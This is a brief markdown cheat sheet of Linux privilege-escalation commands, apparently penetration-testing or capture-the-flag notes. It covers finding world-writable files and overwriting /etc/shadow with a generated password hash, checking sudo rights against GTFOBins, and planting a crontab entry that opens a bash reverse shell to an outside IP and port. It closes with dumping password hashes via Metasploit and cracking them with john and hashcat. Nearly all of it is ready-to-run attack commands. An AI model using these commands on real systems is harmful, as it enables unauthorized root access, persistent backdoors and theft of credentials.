# Weak Permissions

```
find / -not type l -perm -o+w
openssl passwd -1 -salt abc password
vi /etc/shadow
su -
```

# Sudo Privs

```
sudo -l -> gtfo bins
```

# Crontab persistence

```shell
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'" > cron
crontab -i cron
crontab -l
```

# Types of hashes
- $1 - MD5
- $2 - Blowfish
- $5 - SHA-256
- $6 - SHA-512

```msfcosnole
use post/linux/gather/hashdump
john --format=sha512crypt [FILE] -w=[WORDLIST]
hashcat --help | grep sha512
hashcat -a3 -m 1800 [HASH] [WORDLIST]
```